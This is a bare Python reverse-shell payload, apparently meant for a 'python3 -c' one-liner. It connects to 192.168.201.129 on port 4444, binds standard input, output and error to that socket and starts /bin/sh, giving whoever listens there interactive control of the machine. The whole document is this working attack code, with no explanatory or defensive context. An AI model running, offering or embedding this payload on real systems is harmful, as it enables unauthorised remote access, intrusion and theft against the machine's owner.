#python3 -c 

import socket, subprocess, os
s = socket.socket()
s.connect(("192.168.201.129", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
subprocess.call(["/bin/sh"])
